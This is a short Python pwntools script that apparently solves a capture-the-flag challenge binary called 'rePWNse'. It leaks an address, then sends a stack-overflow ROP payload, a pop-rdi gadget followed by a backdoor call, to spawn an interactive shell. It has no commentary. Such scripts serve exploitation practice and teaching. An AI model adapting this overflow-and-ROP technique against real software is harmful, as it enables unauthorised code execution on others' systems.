from pwn import *

p = process("./rePWNse")

p.recvuntil("digits:")
p.sendline(b"1")
p.sendline(b"9")
p.sendline(b"1")
p.sendline(b"9")
p.sendline(b"8")
p.sendline(b"1")
p.sendline(b"0")
p.recvuntil("is:0x")
binsh = p.recv(8).decode("utf-8")
binsh = binsh[:-1]
print("addr_hex:",binsh)
binsh = int(binsh,16)
print("int:",binsh)

pop_rdi = 0x40168E
backdoor = 0x401296

payload = b"a" * 0x40 + b"deadbeef" + p64(pop_rdi) + p64(binsh) + p64(backdoor)
p.sendafter("want?", payload)

p.interactive()

